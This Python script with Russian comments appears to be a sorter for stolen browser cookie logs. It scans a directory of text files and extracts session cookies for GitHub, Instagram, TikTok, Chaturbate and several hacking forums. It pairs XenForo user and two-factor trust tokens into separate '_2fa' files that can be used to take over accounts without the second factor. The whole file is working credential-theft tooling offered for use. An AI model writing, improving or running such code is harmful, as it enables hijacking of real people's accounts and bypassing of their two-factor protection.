from tkinter import filedialog
from tkinter import *

from threading import Thread
from time import time
import os

from queue import Queue
import threading

def search_files(directory: str, extensions: tuple, results: list) -> None:
    for entry in os.scandir(directory):
        if entry.is_file() and entry.name.endswith(extensions):
            results.append(entry.path)
        elif entry.is_dir():
            search_files(entry.path, extensions, results)

def start_thread(q: Queue, extensions: tuple, results: list) -> None:
    while not q.empty():
        search_files(q.get(), extensions, results)

def fast_search(directory: str, extensions: tuple = ('.seco', '.txt'), threads_count: int = 100) -> list:
    if not os.path.isdir(directory):
        raise ValueError(f"The path {directory} is not a valid directory")
    results = []
    threads = []
    q = Queue()

    for entry in os.scandir(directory):
        if entry.is_dir():
            q.put(entry)

    for _ in range(threads_count):
        thread = threading.Thread(target=start_thread, args=(q, extensions, results))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return results

def read_cookie(txt: str):
	template = [
		{"url": "bhf.pro", "cookie": ["xf_user", "xf_tfa_trust"]},
		{"url": "lolz.live", "cookie": ["xf_user", "xf_tfa_trust"]},
		{"url": "zelenka.guru", "cookie": ["xf_user", "xf_tfa_trust"]},
		{"url": "raidforum.co", "cookie": ["xf_user", "xf_tfa_trust"]},
		{"url": "cracked.io", "cookie": ["mybbuser"]},
		{"url": "github.com", "cookie": ["user_session"]},

		{"url": "chaturbate", "cookie": ["sessionid"]},
		{"url": "instagram.com", "cookie": ["sessionid"]},
		{"url": "tiktok.com", "cookie": ["sessionid"]},
		
		# {"url": "xss.is", "cookie": [""]},
		# {"url": "forum.exploit.in", "cookie": [""]},

		# {"url": "cracked.io", "cookie": ["mybbuser"]},
		# {"url": "cracked.io", "cookie": ["mybbuser"]},
	]

	try:
		with open(txt, "r", encoding="utf-8", errors="ignore") as f:	
			found_cookies = {}
			for line in f.readlines():
				cline = line.strip().split()
			
				if len(cline) == 7: # текстовик похоже с куками.
					curl 	= cline[0]
					cname 	= cline[5]
					cvalue 	= cline[6]

					for site in template:
						if site["url"] in curl and cname in site["cookie"]:
							domain_name = site["url"]

							if cname in ["xf_user", "xf_tfa_trust"]:
								found_cookies[cname] = cvalue
							else:
								with open(f"{domain_name}.txt", "a", encoding="utf-8") as out_f:
									out_f.write(f"{cvalue}\n")
							break

			# Если найдены обе куки `xf_user` и `xf_tfa_trust`
			if "xf_user" in found_cookies and "xf_tfa_trust" in found_cookies:
				with open(f"{domain_name}_2fa.txt", "a", encoding="utf-8") as out_f:
					out_f.write(f"{found_cookies['xf_user']}:{found_cookies['xf_tfa_trust']}\n")
			elif "xf_user" in found_cookies:
				with open(f"{domain_name}.txt", "a", encoding="utf-8") as out_f:
					out_f.write(f"{found_cookies['xf_user']}\n")


					# for item in template:
					# 	if item["url"] in curl: # Если нашли нужный сайт (не точное сравнение, поддомены , точки и т.д)								
					# 		for qyt in item["cookie"]:
					# 			if qyt == cname: # название кукисов (точное сравнение, нужны точные данные)
					# 				print(cname)




	except Exception as ex:
		pass


if __name__ == '__main__':
	root = Tk()
	root.withdraw()
	dirname = filedialog.askdirectory()
	threads = 10

	start = time()
	files = fast_search(dirname, ('.txt'), threads)
	total = len(files)
	for i, txt in enumerate(files):
		read_cookie(txt)
		print(f"In Progress: [{total}/{i}]", end="\r")

	print(f'\nРабота окончена!\nВремя затраченное на работу {round(time() - start, 2)}s')

